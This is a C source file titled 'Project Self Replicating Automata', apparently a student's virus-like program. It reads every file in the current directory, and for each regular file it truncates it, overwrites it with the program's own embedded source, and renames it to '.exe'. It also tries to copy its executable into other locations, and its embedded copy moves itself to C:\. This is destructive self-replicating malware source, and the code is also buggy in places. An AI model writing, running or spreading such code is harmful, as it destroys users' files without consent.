/*
Project Self Replicating Automata
Author : Sami N.
*/

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include<unistd.h>

int FileOrDirectory(char path[255]);
int CopyFile(char ftarget[255]);
const char* Quine();

int main()
{
    // List all files in current directory, and save them in string array "filename"
    //rename("ProjectSRA.exe", "env\\ProjectSRA.exe");
    //chdir("env"); // for testing purposes
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    char *filename[255][255];

    char Sourcecode[120][999] = {
"#include <stdio.h>",
"#include <stdlib.h>",
"#include <dirent.h>",
"#include <string.h>",
"#include <sys/stat.h>",
"#include<unistd.h>",
"int FileOrDirectory(char path[255]);",
"int CopyFile(char ftarget[255]);",
"const char* Quine();",

"int main()",
"{",
"    // List all files in current directory, and save them in string array",
"    rename(\"ProjectSRA.exe\", \"C:\\ProjectSRA.exe\");",
"    //chdir(\"env\"); // for testing purposes",
"    DIR *d;",
"   struct dirent *dir;",
"    d = opendir(\".\");",
"   char *filename[255][255];",

"    char files[255];",
"    char newdir[255];",
"    int index = 0;",
"    int res;",
"    int nbfiles=0;",
"    int nbdirectory=0;",
"    if (d)",
" {",
"       while ((dir = readdir(d)) != NULL)",
"        {",
"            filename[index][255] = malloc(strlen(dir->d_name)+1);",
"            printf(\"%s\\n\", dir->d_name);",
"            strcpy(filename[index],dir->d_name);",
"            index++;",
"        }",
"        closedir(d);",
"        filename[index+1][255] = \'\\0\';",
"        printf(\"\\n\");",
"        for(int i=2;i<index;i++)",
"        {",
"            printf(\"%s\\n\", filename[i]);",
"        }",
"    }",
"    // figure out whether a line in filename is a file or directory",
"        for(int i2=0;i2<index;i2++){",
"            res = FileOrDirectory(filename[i2]);",
"            if(res == 1){",
"                // function fopen",
"                nbfiles++;",
"                FILE* target;",
"                target = fopen(filename[i2], \"w\");",
"                if (target == NULL){",
"                    i2++;",
"                }",
"                // fprintf source code, and rename to .exe",
"                rename(filename[i2], strcat(filename[i2], \".exe\"));",
"                fclose(target);",
"            }",
"            else if(res == 3)",
"            {",
"                char dircpy[255];",
"                strcpy(dircpy, filename[i2]);",
"                strcat(dircpy, \"\\ProjectSRA.exe\");",
"                CopyFile(dircpy);",
"                nbdirectory++;",
"            }",
"        }",
"        printf(\" There are %d files and %d directories\", nbfiles, nbdirectory);",
"    // file fopen line, edit, and insert code into the end of the file",
"    // auto-replication of program into another exe",
"    char pause[20];",
"    scanf(\"%s\", &pause);",
"    return 0;",
"}",
"int FileOrDirectory(char path[255]){",
"    struct stat s;",
"    printf(\"%s\", path);",
"    if( stat(path,&s) == 0 )",
"    {",
"        if( s.st_mode & S_IFDIR )",
"        {",
"            return 0;",
"        }",
"        else if( s.st_mode & S_IFREG )",
"        {",
"            return 1;",
"        }",
"        else",
"        {",
"            return 2;",
"        }",
"    }",
"    else",
"    {",
"        return 3;",
"    }",
"}",
"int CopyFile(char ftarget[255]){",
"    char ch, source_file[25], target_file[25];",
"    FILE *source, *target;",
"    source = fopen(\"ProjectSRA.exe\", \"r\");",
"        if( source == NULL )",
"        {",
"            return 1;",
"        }",
"    target = fopen(ftarget, \"w\");",
"    if( target == NULL )",
"    {",
"        return 1;",
"    }",
"    while( ( ch = fgetc(source) ) != EOF )",
"        fputc(ch, target);",
"        printf(\"File copied successfully.\\n\");",
"        fclose(source);",
"        fclose(target);",
"        return 0;",
"}"
};

    char files[255];
    char newdir[255];
    int index = 0;
    int res;
    int nbfiles=0;
    int nbdirectory=0;
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            filename[index][255] = malloc(strlen(dir->d_name)+1);
            printf("%s\n", dir->d_name);
            strcpy(filename[index],dir->d_name);
            index++;
        }
        closedir(d);
        filename[index+1][255] = '\0';
        printf("\n");
        for(int i=2;i<index;i++)
        {
            printf("%s\n", filename[i]);
        }

    }
    // figure out whether a line in filename is a file or directory
        for(int i2=0;i2<index;i2++){
            res = FileOrDirectory(filename[i2]);
            if(res == 1){
                // function fopen
                nbfiles++;
                FILE* target;
                target = fopen(filename[i2], "w");
                if (target == NULL){
                    i2++;
                }
                for(int i3=0;i3<121;i3++){
                    fprintf(target, "%s\n", Sourcecode[i3]);
                }
                rename(filename[i2], strcat(filename[i2], ".exe"));
                fclose(target);
            }
            else if(res == 3)
            {
                char dircpy[255];
                strcpy(dircpy, filename[i2]);
                strcat(dircpy, "\\ProjectSRA.exe");
                CopyFile(dircpy);
                nbdirectory++;
            }
        }
        printf(" There are %d files and %d directories", nbfiles, nbdirectory);
    // file fopen line, edit, and insert code into the end of the file
    // auto-replication of program into another exe
    char pause[20];
    scanf("%s", &pause);


    return 0;
}

int FileOrDirectory(char path[255]){

    struct stat s;
    printf("%s", path);
    if( stat(path,&s) == 0 )
    {
        if( s.st_mode & S_IFDIR )
        {
            return 0;
        }
        else if( s.st_mode & S_IFREG )
        {
            return 1;
        }
        else
        {
            return 2;
        }
    }
    else
    {
        return 3;
    }

}

int CopyFile(char ftarget[255]){

    char ch, source_file[25], target_file[25];

    FILE *source, *target;

    source = fopen("ProjectSRA.exe", "r");

        if( source == NULL )
        {
            return 1;
        }


    target = fopen(ftarget, "w");

    if( target == NULL )
    {
        return 1;
    }

    while( ( ch = fgetc(source) ) != EOF )
        fputc(ch, target);

        printf("File copied successfully.\n");
        fclose(source);
        fclose(target);

        return 0;
}






